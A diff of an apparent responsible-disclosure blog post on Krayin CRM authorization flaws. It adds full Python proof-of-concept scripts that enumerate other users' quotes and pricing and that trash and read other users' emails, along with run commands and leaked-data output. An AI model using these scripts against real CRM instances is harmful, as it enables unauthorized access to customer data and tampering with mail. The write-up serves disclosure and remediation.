@@ -1,46 +1,46 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#080706">
-  <meta name="description" content="A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.">
-  <meta property="og:type" content="article">
-  <meta property="og:site_name" content="0xAdham Field Notes">
-  <meta property="og:title" content="A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots · 0xAdham">
-  <meta property="og:description" content="A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.">
-  <meta name="twitter:card" content="summary_large_image">
-  <title>A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots · 0xAdham</title>
-  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
-  <link rel="stylesheet" href="/assets/site.css">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#080706">
+  <meta name="description" content="A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="0xAdham Field Notes">
+  <meta property="og:title" content="A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots · 0xAdham">
+  <meta property="og:description" content="A white-box review of Krayin CRM turned up three CVEs: an incomplete-fix IDOR in the Quote module, a write-path BOLA in Mail, and a DNS-rebinding bypass of the webhook SSRF filter. Root cause, PoCs and fixes for all three, fixed in 2.2.7.">
+  <meta name="twitter:card" content="summary_large_image">
+  <title>A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots · 0xAdham</title>
+  <link rel="icon" type="image/svg+xml" href="/assets/mark.svg">
+  <link rel="stylesheet" href="/assets/site.css">
 </head>
 <body>
-  <header class="site-header">
-    <div class="wrap header-inner">
-      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
-        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
-        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
-      </a>
-      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
-      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
-        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
-      </nav>
-    </div>
-  </header>
-  <main>
-    <div class="wrap article-header">
-      <div class="eyebrow"><span class="index">FIELD NOTE</span> Responsible disclosure</div>
-      <h1 class="page-title">A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots</h1>
-      <div class="article-byline">
-        <span>By Adham Mohammed / 0xAdham</span>
-        <span>2026-10-19</span>
-        <span>Responsible disclosure · Web security research</span>
-      </div>
-    </div>
-    <section class="section">
-      <div class="wrap content-layout">
-        <article class="prose">
-          <p>A white-box review of one open-source Laravel CRM, written up for the people who patch<br />
+  <header class="site-header">
+    <div class="wrap header-inner">
+      <a class="brand" href="/" aria-label="0xAdham Field Notes home">
+        <svg class="brand-mark" viewBox="0 0 40 40" aria-hidden="true"><path d="M10 4H4v32h6M30 4h6v32h-6" fill="none" stroke="currentColor" stroke-width="3"/><rect x="12" y="17" width="7" height="7" fill="currentColor"/><rect x="22" y="17" width="7" height="7" fill="#ff3428"/></svg>
+        <span class="brand-name">0xADHAM</span><span class="brand-note">Field notes / security research</span>
+      </a>
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="primary-nav">[ Menu ]</button>
+      <nav class="nav-links" id="primary-nav" aria-label="Main navigation">
+        <a href="/">Home</a><a href="/writing/" aria-current="page">Writing</a><a href="/research/">Research</a><a href="/about/">About</a>
+      </nav>
+    </div>
+  </header>
+  <main>
+    <div class="wrap article-header">
+      <div class="eyebrow"><span class="index">FIELD NOTE</span> Responsible disclosure</div>
+      <h1 class="page-title">A Patch Is Not a Fix: Chaining Krayin CRM&#x27;s Blind Spots</h1>
+      <div class="article-byline">
+        <span>By Adham Mohammed / 0xAdham</span>
+        <span>2026-10-19</span>
+        <span>Responsible disclosure · Web security research</span>
+      </div>
+    </div>
+    <section class="section">
+      <div class="wrap content-layout">
+        <article class="prose">
+          <p>A white-box review of one open-source Laravel CRM, written up for the people who patch<br />
 it and the people who just need to know how bad it was. All three fixed in 2.2.7.</p>
 <ul>
 <li><strong>Author:</strong> Adham · @0xAdham1</li>
@@ -48,6 +48,7 @@ it and the people who just need to know how bad it was. All three fixed in 2.2.7
 <li><strong>Reported:</strong> 2026-10-05</li>
 <li><strong>Fixed in:</strong> 2.2.7</li>
 <li><strong>CVEs:</strong> 3</li>
+<li><strong>PoCs:</strong> <a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">Python scripts on GitHub</a></li>
 </ul>
 <table>
 <thead>
@@ -179,8 +180,8 @@ return response()-&gt;json(['data' =&gt; $this-&gt;getLeadProductsForQuote($lead
 total, the full pricing of another user's deal.</p>
 <p><strong>B2: <code>search()</code> → <code>GET /admin/quotes/search</code></strong></p>
 <pre><code class="language-php">$quotes = $this-&gt;quoteRepository
-    -&gt;pushCriteria(app(RequestCriteria::class))
-    -&gt;all();  // no data-scope filter
+    -&gt;pushCriteria(app(RequestCriteria::class))
+    -&gt;all();  // no data-scope filter
 return QuoteResource::collection($quotes);
 </code></pre>
 <p><code>-&gt;all()</code> applies only the request's search criteria, never a restriction to the caller's<br />
@@ -188,30 +189,446 @@ authorized IDs. <code>QuoteResource</code> then serializes subject, description,
 address, totals, the linked person (customer PII) and related leads, for every user's<br />
 quotes.</p>
 <h3>PoC: walkthrough and captured leak</h3>
-<p>Local instance, Krayin 2.2 branch. Owner (global, ID 1) owns a lead and a quote; Agent<br />
-(individual) owns nothing but holds the Quote feature permission. Both endpoints are GETs,<br />
-so no CSRF token is needed.</p>
-<pre><code class="language-bash">curl -s &quot;$BASE/admin/quotes/lead-products/1&quot; \
-  -H &quot;Cookie: $COOKIE&quot; -H &quot;Accept: application/json&quot; | jq .
+<p>The repository PoC exercises both vulnerable read paths and prints the fields that are exposed. Run it
+with a low-privilege agent session against an authorized local test instance:</p>
+<pre><code class="language-bash">python3 CVE-2026-112286.py --url http://127.0.0.1:8000 \
+  --login-email agent@test.local --login-password agent123 \
+  --lead-ids 1
 </code></pre>
-<pre><code class="language-json">{ &quot;data&quot;: [ {
-  &quot;product_id&quot;: 1, &quot;name&quot;: &quot;Owner Secret Widget&quot;,
-  &quot;quantity&quot;: 3, &quot;price&quot;: 1234.56, &quot;total&quot;: 3703.68
-} ] }
+<details>
+<summary>View the complete <code>CVE-2026-112286.py</code> source</summary>
+<pre><code class="language-python">import argparse
+import datetime
+import http.cookiejar
+import json
+import os
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+UA = &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&quot;
+
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *a, **k):
+        return None
+
+
+class Session:
+    def __init__(self, base, cookie_name, insecure, proxy, headers, base_path, timeout):
+        self.base = base.rstrip(&quot;/&quot;)
+        self.base_path = &quot;/&quot; + base_path.strip(&quot;/&quot;) if base_path.strip(&quot;/&quot;) else &quot;&quot;
+        self.cookie_name = cookie_name
+        self.headers = headers
+        self.timeout = timeout
+        self.jar = http.cookiejar.CookieJar()
+        h = [urllib.request.HTTPCookieProcessor(self.jar), _NoRedirect]
+        if insecure:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            h.append(urllib.request.HTTPSHandler(context=ctx))
+        if proxy:
+            h.append(urllib.request.ProxyHandler({&quot;http&quot;: proxy, &quot;https&quot;: proxy}))
+        self.opener = urllib.request.build_opener(*h)
+
+    def _xsrf(self):
+        for c in self.jar:
+            if c.name == &quot;XSRF-TOKEN&quot;:
+                return urllib.parse.unquote(c.value)
+        return None
+
+    def _has(self, name):
+        return any(c.name == name for c in self.jar)
+
+    def request(self, method, path, form=None):
+        url = path if path.startswith(&quot;http&quot;) else self.base + self.base_path + path
+        data = urllib.parse.urlencode(form, doseq=True).encode() if form is not None else None
+        r = urllib.request.Request(url, data=data, method=method)
+        r.add_header(&quot;User-Agent&quot;, UA)
+        r.add_header(&quot;Accept&quot;, &quot;application/json, text/html;q=0.8&quot;)
+        r.add_header(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;)
+        if data is not None:
+            r.add_header(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)
+        x = self._xsrf()
+        if x and method not in (&quot;GET&quot;, &quot;HEAD&quot;):
+            r.add_header(&quot;X-XSRF-TOKEN&quot;, x)
+        for k, v in self.headers.items():
+            r.add_header(k, v)
+        try:
+            resp = self.opener.open(r, timeout=self.timeout)
+            return resp.status, resp.read().decode(errors=&quot;replace&quot;)
+        except urllib.error.HTTPError as e:
+            return e.code, e.read().decode(errors=&quot;replace&quot;)
+        except urllib.error.URLError as e:
+            return 0, f&quot;__URLERROR__ {e.reason}&quot;
+
+    def get(self, path):
+        return self.request(&quot;GET&quot;, path)
+
+    def set_raw_cookie(self, header):
+        for part in header.split(&quot;;&quot;):
+            if &quot;=&quot; in part:
+                n, v = part.strip().split(&quot;=&quot;, 1)
+                self.jar.set_cookie(http.cookiejar.Cookie(
+                    0, n, v, None, False, &quot;&quot;, False, False, &quot;/&quot;, True,
+                    False, None, True, None, None, {}))
+
+    def login(self, email, password):
+        st, html = self.get(&quot;/admin/login&quot;)
+        if st != 200:
+            return False
+        m = re.search(r&#x27;name=&quot;_token&quot;[^&gt;]*value=&quot;([^&quot;]+)&quot;&#x27;, html)
+        token = m.group(1) if m else self._xsrf()
+        self.request(&quot;POST&quot;, &quot;/admin/login&quot;, form={&quot;_token&quot;: token or &quot;&quot;, &quot;email&quot;: email, &quot;password&quot;: password})
+        return self._has(self.cookie_name)
+
+    def authed(self):
+        return self.get(&quot;/admin/dashboard&quot;)[0] == 200
+
+
+def parse_ids(spec):
+    ids = set()
+    for part in str(spec).split(&quot;,&quot;):
+        part = part.strip()
+        if not part:
+            continue
+        if &quot;-&quot; in part:
+            a, b = part.split(&quot;-&quot;, 1)
+            ids.update(range(int(a), int(b) + 1))
+        else:
+            ids.add(int(part))
+    out = sorted(i for i in ids if i &gt; 0)
+    if len(out) &gt; 2000:
+        sys.exit(&quot;refusing: more than 2000 ids; narrow the range for a scoped test&quot;)
+    return out
+
+
+def parse_headers(items):
+    out = {}
+    for it in items or []:
+        if &quot;:&quot; not in it:
+            sys.exit(f&quot;bad --header {it!r}; expected &#x27;Name: value&#x27;&quot;)
+        k, v = it.split(&quot;:&quot;, 1)
+        out[k.strip()] = v.strip()
+    return out
+
+
+def sjson(s):
+    try:
+        d = json.loads(s)
+        return d if isinstance(d, dict) else {}
+    except ValueError:
+        return {}
+
+
+def log(evidence, outdir, name, status, body, verdict):
+    rec = {&quot;check&quot;: name, &quot;ts&quot;: datetime.datetime.now(datetime.timezone.utc).isoformat(),
+           &quot;status&quot;: status, &quot;verdict&quot;: verdict, &quot;body_excerpt&quot;: body[:600]}
+    evidence.append(rec)
+    if outdir:
+        with open(os.path.join(outdir, f&quot;{name}.json&quot;), &quot;w&quot;) as fh:
+            fh.write(json.dumps(rec, indent=2))
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;CVE-2026-112286 Krayin Quote IDOR validator&quot;)
+    ap.add_argument(&quot;--url&quot;, required=True, help=&quot;target base URL&quot;)
+    ap.add_argument(&quot;--cookie&quot;, help=&quot;raw Cookie header for a low-priv session&quot;)
+    ap.add_argument(&quot;--cookie-name&quot;, default=&quot;krayin_crm_session&quot;)
+    ap.add_argument(&quot;--login-email&quot;)
+    ap.add_argument(&quot;--login-password&quot;)
+    ap.add_argument(&quot;--proxy&quot;, help=&quot;intercepting proxy, e.g. http://127.0.0.1:8080&quot;)
+    ap.add_argument(&quot;--header&quot;, action=&quot;append&quot;, default=[], metavar=&quot;&#x27;K: V&#x27;&quot;, help=&quot;extra header; repeatable&quot;)
+    ap.add_argument(&quot;--base-path&quot;, default=&quot;&quot;, help=&quot;path prefix for sub-dir installs, e.g. /crm&quot;)
+    ap.add_argument(&quot;--insecure&quot;, action=&quot;store_true&quot;)
+    ap.add_argument(&quot;--timeout&quot;, type=int, default=20)
+    ap.add_argument(&quot;--lead-ids&quot;, default=&quot;1&quot;, help=&quot;&#x27;1&#x27;, &#x27;1-50&#x27;, &#x27;1,2,5-9&#x27;&quot;)
+    ap.add_argument(&quot;--out&quot;, help=&quot;evidence directory&quot;)
+    args = ap.parse_args()
+
+    lead_ids = parse_ids(args.lead_ids)
+    outdir = args.out
+    if outdir:
+        os.makedirs(outdir, exist_ok=True)
+
+    s = Session(args.url, args.cookie_name, args.insecure, args.proxy,
+                parse_headers(args.header), args.base_path, args.timeout)
+    if args.cookie:
+        s.set_raw_cookie(args.cookie)
+    elif args.login_email and args.login_password:
+        if not s.login(args.login_email, args.login_password):
+            sys.exit(&quot;refusing: authentication failed&quot;)
+    else:
+        sys.exit(&quot;provide --cookie or --login-email/--login-password&quot;)
+    if not s.authed():
+        sys.exit(&quot;refusing: session not authenticated (/admin/dashboard not reachable)&quot;)
+    print(f&quot;[+] authenticated on {args.url}&quot;)
+
+    evidence = []
+    hits = 0
+    for lid in lead_ids:
+        st, body = s.get(f&quot;/admin/quotes/lead-products/{lid}&quot;)
+        leaked = sjson(body).get(&quot;data&quot;, []) if st == 200 else []
+        v = &quot;VULNERABLE&quot; if leaked else &quot;not-confirmed&quot;
+        if leaked:
+            hits += 1
+        print(f&quot;  B1 lead-products/{lid}  -&gt; {st}  {v}&quot;)
+        for p in leaked[:3]:
+            if isinstance(p, dict):
+                print(&quot;     leaked:&quot;, json.dumps({k: p.get(k) for k in (&quot;product_id&quot;, &quot;name&quot;, &quot;quantity&quot;, &quot;price&quot;, &quot;total&quot;) if k in p}))
+        log(evidence, outdir, f&quot;B1-leadProducts-{lid}&quot;, st, body, v)
+    if len(lead_ids) &gt; 1:
+        print(f&quot;  B1 exposure: {hits}/{len(lead_ids)} lead ids leaked product/pricing data&quot;)
+
+    st, body = s.get(&quot;/admin/quotes/search?search=&quot;)
+    quotes = sjson(body).get(&quot;data&quot;, []) if st == 200 else []
+    v = &quot;VULNERABLE&quot; if quotes else &quot;not-confirmed&quot;
+    print(f&quot;  B2 quotes/search        -&gt; {st}  {v}  ({len(quotes)} quote(s))&quot;)
+    log(evidence, outdir, &quot;B2-search&quot;, st, body, v)
+
+    if outdir:
+        with open(os.path.join(outdir, &quot;summary.json&quot;), &quot;w&quot;) as fh:
+            fh.write(json.dumps(evidence, indent=2))
+        print(f&quot;[+] evidence written to {outdir}/&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
 </code></pre>
-<p>The agent owns nothing, yet reads Owner's product, quantity and exact pricing. The <code>search</code><br />
-endpoint goes further, returning full <code>QuoteResource</code> objects with billing addresses and the<br />
-customer's email. The published PoC (<code>CVE-2026-112286.py</code>) is read-only and refuses any<br />
-non-local <code>--base</code>.</p>
+</details>
+<details>
+<summary>View the complete <code>CVE-2026-112287.py</code> source</summary>
+<pre><code class="language-python">import argparse
+import datetime
+import http.cookiejar
+import json
+import os
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+UA = &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36&quot;
+
+
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *a, **k):
+        return None
+
+
+class Session:
+    def __init__(self, base, cookie_name, insecure, proxy, headers, base_path, timeout):
+        self.base = base.rstrip(&quot;/&quot;)
+        self.base_path = &quot;/&quot; + base_path.strip(&quot;/&quot;) if base_path.strip(&quot;/&quot;) else &quot;&quot;
+        self.cookie_name = cookie_name
+        self.headers = headers
+        self.timeout = timeout
+        self.jar = http.cookiejar.CookieJar()
+        h = [urllib.request.HTTPCookieProcessor(self.jar), _NoRedirect]
+        if insecure:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            h.append(urllib.request.HTTPSHandler(context=ctx))
+        if proxy:
+            h.append(urllib.request.ProxyHandler({&quot;http&quot;: proxy, &quot;https&quot;: proxy}))
+        self.opener = urllib.request.build_opener(*h)
+
+    def _xsrf(self):
+        for c in self.jar:
+            if c.name == &quot;XSRF-TOKEN&quot;:
+                return urllib.parse.unquote(c.value)
+        return None
+
+    def _has(self, name):
+        return any(c.name == name for c in self.jar)
+
+    def request(self, method, path, form=None):
+        url = path if path.startswith(&quot;http&quot;) else self.base + self.base_path + path
+        data = urllib.parse.urlencode(form, doseq=True).encode() if form is not None else None
+        r = urllib.request.Request(url, data=data, method=method)
+        r.add_header(&quot;User-Agent&quot;, UA)
+        r.add_header(&quot;Accept&quot;, &quot;application/json, text/html;q=0.8&quot;)
+        r.add_header(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;)
+        if data is not None:
+            r.add_header(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;)
+        x = self._xsrf()
+        if x and method not in (&quot;GET&quot;, &quot;HEAD&quot;):
+            r.add_header(&quot;X-XSRF-TOKEN&quot;, x)
+        for k, v in self.headers.items():
+            r.add_header(k, v)
+        try:
+            resp = self.opener.open(r, timeout=self.timeout)
+            return resp.status, resp.read().decode(errors=&quot;replace&quot;)
+        except urllib.error.HTTPError as e:
+            return e.code, e.read().decode(errors=&quot;replace&quot;)
+        except urllib.error.URLError as e:
+            return 0, f&quot;__URLERROR__ {e.reason}&quot;
+
+    def get(self, path):
+        return self.request(&quot;GET&quot;, path)
+
+    def set_raw_cookie(self, header):
+        for part in header.split(&quot;;&quot;):
+            if &quot;=&quot; in part:
+                n, v = part.strip().split(&quot;=&quot;, 1)
+                self.jar.set_cookie(http.cookiejar.Cookie(
+                    0, n, v, None, False, &quot;&quot;, False, False, &quot;/&quot;, True,
+                    False, None, True, None, None, {}))
+
+    def login(self, email, password):
+        st, html = self.get(&quot;/admin/login&quot;)
+        if st != 200:
+            return False
+        m = re.search(r&#x27;name=&quot;_token&quot;[^&gt;]*value=&quot;([^&quot;]+)&quot;&#x27;, html)
+        token = m.group(1) if m else self._xsrf()
+        self.request(&quot;POST&quot;, &quot;/admin/login&quot;, form={&quot;_token&quot;: token or &quot;&quot;, &quot;email&quot;: email, &quot;password&quot;: password})
+        return self._has(self.cookie_name)
+
+    def authed(self):
+        return self.get(&quot;/admin/dashboard&quot;)[0] == 200
+
+
+def parse_headers(items):
+    out = {}
+    for it in items or []:
+        if &quot;:&quot; not in it:
+            sys.exit(f&quot;bad --header {it!r}; expected &#x27;Name: value&#x27;&quot;)
+        k, v = it.split(&quot;:&quot;, 1)
+        out[k.strip()] = v.strip()
+    return out
+
+
+def sjson(s):
+    try:
+        d = json.loads(s)
+        return d if isinstance(d, dict) else {}
+    except ValueError:
+        return {}
+
+
+def log(evidence, outdir, name, status, body, verdict):
+    rec = {&quot;check&quot;: name, &quot;ts&quot;: datetime.datetime.now(datetime.timezone.utc).isoformat(),
+           &quot;status&quot;: status, &quot;verdict&quot;: verdict, &quot;body_excerpt&quot;: body[:600]}
+    evidence.append(rec)
+    if outdir:
+        with open(os.path.join(outdir, f&quot;{name}.json&quot;), &quot;w&quot;) as fh:
+            fh.write(json.dumps(rec, indent=2))
+
+
+def main():
+    ap = argparse.ArgumentParser(description=&quot;CVE-2026-112287 Krayin Mail BOLA validator&quot;)
+    ap.add_argument(&quot;--url&quot;, required=True, help=&quot;target base URL&quot;)
+    ap.add_argument(&quot;--cookie&quot;, help=&quot;raw Cookie header for a low-priv session&quot;)
+    ap.add_argument(&quot;--cookie-name&quot;, default=&quot;krayin_crm_session&quot;)
+    ap.add_argument(&quot;--login-email&quot;)
+    ap.add_argument(&quot;--login-password&quot;)
+    ap.add_argument(&quot;--proxy&quot;, help=&quot;intercepting proxy, e.g. http://127.0.0.1:8080&quot;)
+    ap.add_argument(&quot;--header&quot;, action=&quot;append&quot;, default=[], metavar=&quot;&#x27;K: V&#x27;&quot;, help=&quot;extra header; repeatable&quot;)
+    ap.add_argument(&quot;--base-path&quot;, default=&quot;&quot;, help=&quot;path prefix for sub-dir installs, e.g. /crm&quot;)
+    ap.add_argument(&quot;--insecure&quot;, action=&quot;store_true&quot;)
+    ap.add_argument(&quot;--timeout&quot;, type=int, default=20)
+    ap.add_argument(&quot;--email-id&quot;, type=int, required=True, help=&quot;a single out-of-scope email id&quot;)
+    ap.add_argument(&quot;--no-restore&quot;, action=&quot;store_true&quot;, help=&quot;do NOT auto-restore (leaves the email trashed)&quot;)
+    ap.add_argument(&quot;--out&quot;, help=&quot;evidence directory&quot;)
+    args = ap.parse_args()
+
+    eid = args.email_id
+    outdir = args.out
+    if outdir:
+        os.makedirs(outdir, exist_ok=True)
+
+    s = Session(args.url, args.cookie_name, args.insecure, args.proxy,
+                parse_headers(args.header), args.base_path, args.timeout)
+    if args.cookie:
+        s.set_raw_cookie(args.cookie)
+    elif args.login_email and args.login_password:
+        if not s.login(args.login_email, args.login_password):
+            sys.exit(&quot;refusing: authentication failed&quot;)
+    else:
+        sys.exit(&quot;provide --cookie or --login-email/--login-password&quot;)
+    if not s.authed():
+        sys.exit(&quot;refusing: session not authenticated (/admin/dashboard not reachable)&quot;)
+    print(f&quot;[+] authenticated on {args.url}&quot;)
+
+    evidence = []
+
+    # A0 control: read must be gated for an out-of-scope email
+    st, _ = s.get(f&quot;/admin/mail/inbox/{eid}&quot;)
+    gated = st == 401
+    print(f&quot;  A0 control read inbox/{eid} -&gt; {st}  &quot;
+          f&quot;{&#x27;(gated — out-of-scope baseline, good)&#x27; if gated else &#x27;(NOT 401 — pick an out-of-scope email id)&#x27;}&quot;)
+    log(evidence, outdir, &quot;A0-control-read&quot;, st, &quot;&quot;, &quot;gated&quot; if gated else &quot;CHECK-SETUP&quot;)
+    if not gated:
+        print(&quot;     ! baseline not met; skipping the write so nothing is touched.&quot;)
+        _flush(evidence, outdir)
+        return
+
+    # A1 single reversible write: trash the out-of-scope email
+    st, body = s.request(&quot;DELETE&quot;, f&quot;/admin/mail/{eid}&quot;, form={&quot;type&quot;: &quot;trash&quot;})
+    wrote = st in (200, 302)
+    print(f&quot;  A1 trash /{eid} (type=trash) -&gt; {st}  {&#x27;VULNERABLE&#x27; if wrote else &#x27;blocked&#x27;}&quot;)
+    log(evidence, outdir, &quot;A1-trash&quot;, st, body, &quot;VULNERABLE&quot; if wrote else &quot;blocked&quot;)
+
+    st2, _ = s.get(f&quot;/admin/mail/trash/{eid}&quot;)
+    print(f&quot;     smoking-gun read trash/{eid} -&gt; {st2}  &quot;
+          f&quot;{&#x27;(still 401 — mutated mail it cannot view)&#x27; if st2 == 401 else &#x27;&#x27;}&quot;)
+
+    # A2 disclosure via update(): returns the full EmailResource
+    st, body = s.request(&quot;PUT&quot;, f&quot;/admin/mail/edit/{eid}&quot;, form={&quot;is_read&quot;: &quot;1&quot;})
+    d = sjson(body).get(&quot;data&quot;, {})
+    leaked = {k: d.get(k) for k in (&quot;id&quot;, &quot;subject&quot;, &quot;reply&quot;) if k in d}
+    v = &quot;VULNERABLE&quot; if (st in (200, 302) and leaked) else &quot;not-confirmed&quot;
+    print(f&quot;  A2 disclose edit/{eid} -&gt; {st}  {v}  leaked={json.dumps(leaked)[:160]}&quot;)
+    log(evidence, outdir, &quot;A2-disclose&quot;, st, body, v)
+
+    # A3 restore: move back to inbox so target state is unchanged
+    if args.no_restore:
+        print(&quot;  A3 restore SKIPPED (--no-restore). Email left in Trash; restore manually.&quot;)
+    else:
+        st, body = s.request(&quot;PUT&quot;, f&quot;/admin/mail/edit/{eid}&quot;, form={&quot;folders[]&quot;: &quot;inbox&quot;})
+        print(f&quot;  A3 restore edit/{eid} folders=inbox -&gt; {st}  &quot;
+              f&quot;{&#x27;(reverted)&#x27; if st in (200, 302) else &#x27;(REVERT FAILED — restore manually from Trash)&#x27;}&quot;)
+        log(evidence, outdir, &quot;A3-restore&quot;, st, body, &quot;reverted&quot; if st in (200, 302) else &quot;REVERT-FAILED&quot;)
+
+    _flush(evidence, outdir)
+
+
+def _flush(evidence, outdir):
+    if outdir:
+        with open(os.path.join(outdir, &quot;summary.json&quot;), &quot;w&quot;) as fh:
+            fh.write(json.dumps(evidence, indent=2))
+        print(f&quot;[+] evidence written to {outdir}/&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+</details>
+<pre><code class="language-text">[+] authenticated on http://127.0.0.1:8000
+  B1 lead-products/1  -&gt; 200  VULNERABLE
+     leaked: {&quot;product_id&quot;: 1, &quot;name&quot;: &quot;Owner Secret Widget&quot;, &quot;quantity&quot;: 3, &quot;price&quot;: 1234.56, &quot;total&quot;: 3703.68}
+  B2 quotes/search        -&gt; 200  VULNERABLE  (1 quote(s))
+</code></pre>
+<p>Use <code>--cookie</code> instead of the login options when replaying a captured low-privilege
+session, and <code>--lead-ids 1-50</code> for a scoped exposure check. The repository PoC
+(<code>CVE-2026-112286.py</code>) is strictly read-only; its source and usage are in the
+<a href="https://github.com/0xAdham1/krayin-crm-2.2.7-POC">GitHub PoC repository</a>.</p>
 <h3>Fix: remediation that shipped in 2.2.7</h3>
 <p>Two additions, both mirroring patterns already in the codebase:</p>
 <pre><code class="language-php">// leadProducts()
 $lead = $this-&gt;leadRepository-&gt;findOrFail($leadId);
-$this-&gt;preventUnauthorizedAccess($lead-&gt;user_id);  // add this
+$this-&gt;preventUnauthorizedAccess($lead-&gt;user_id);  // add this
 
 // search(): constrain to the caller's scope before -&gt;all()
 if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
-    $this-&gt;quoteRepository-&gt;whereIn('user_id', $userIds);
+    $this-&gt;quoteRepository-&gt;whereIn('user_id', $userIds);
 }
 </code></pre>
 <p>CVE-2026-61460 fixed object-level authorization on the write path of this controller and<br />
@@ -318,10 +735,10 @@ vulnerability, provable in two requests.</p>
 <h3>Deep dive: root cause and affected endpoints</h3>
 <p>The read path resolves the record's owner and enforces scope. <code>view()</code>:</p>
 <pre><code class="language-php">if ($userIds = bouncer()-&gt;getAuthorizedUserIds()) {
-    $ownerIds = array_filter([$email-&gt;lead?-&gt;user_id, $email-&gt;person?-&gt;user_id]);
-    if ($ownerIds &amp;&amp; empty(array_intersect($ownerIds, $userIds))) {
-        abort(401, trans('admin::app.errors.unauthorized'));
-    }
+    $ownerIds = array_filter([$email-&gt;lead?-&gt;user_id, $email-&gt;person?-&gt;user_id]);
+    if ($ownerIds &amp;&amp; empty(array_intersect($ownerIds, $userIds))) {
+        abort(401, trans('admin::app.errors.unauthorized'));
+    }
 }
 </code></pre>
 <p>None of the four mutating actions do this. Three things make it exploitable rather than<br />
@@ -359,28 +776,31 @@ too.</p>
 through <code>filterAuthorizedRecords()</code>. Mail is the one that skipped the ownership filter on the<br />
 delete and modify path.</p>
 <h3>PoC: trash, bulk-delete and the disclosure write</h3>
-<p>The PoC only ever drives reversible paths (<code>type=trash</code>, <code>is_read</code>) and refuses a non-local<br />
-base. Step 1 trashes Owner's email that step 0 just proved the agent can't read:</p>
-<pre><code class="language-bash">curl -s -X DELETE &quot;$BASE/admin/mail/1&quot; \
-  -H &quot;Cookie: $COOKIE&quot; -H &quot;X-XSRF-TOKEN: $XSRF&quot; \
-  --data-urlencode &quot;type=trash&quot;
-# HTTP 200 { &quot;message&quot;: &quot;Email deleted successfully.&quot; }
+<p>The repository PoC first confirms the out-of-scope read returns <code>401</code>, then runs one
+reversible <code>type=trash</code> write, demonstrates the disclosure through <code>update()</code>, and
+restores the email to the inbox:</p>
+<pre><code class="language-bash">python3 CVE-2026-112287.py --url http://127.0.0.1:8000 \
+  --login-email agent@test.local --login-password agent123 \
+  --email-id 1
 </code></pre>
-<p>Flipping <code>is_read</code> via <code>update()</code> returns the full <code>EmailResource</code>, so the same request that<br />
-tampers also leaks:</p>
-<pre><code class="language-json">{ &quot;id&quot;:1, &quot;subject&quot;:&quot;Owner private email&quot;,
-  &quot;reply&quot;:&quot;secret body&quot;, &quot;is_read&quot;:1,
-  &quot;person&quot;:[ {&quot;value&quot;:&quot;cust@owner.example&quot;} ] }
+<pre><code class="language-text">[+] authenticated on http://127.0.0.1:8000
+  A0 control read inbox/1 -&gt; 401  (gated — out-of-scope baseline, good)
+  A1 trash /1 (type=trash) -&gt; 200  VULNERABLE
+     smoking-gun read trash/1 -&gt; 401  (still 401 — mutated mail it cannot view)
+  A2 disclose edit/1 -&gt; 200  VULNERABLE  leaked={&quot;id&quot;: 1, &quot;subject&quot;: &quot;Owner private email&quot;, &quot;reply&quot;: &quot;secret body&quot;}
+  A3 restore edit/1 folders=inbox -&gt; 200  (reverted)
 </code></pre>
-<blockquote>
-<p>Only ever send <code>type=trash</code> while testing. Any other value hard-deletes.</p>
-</blockquote>
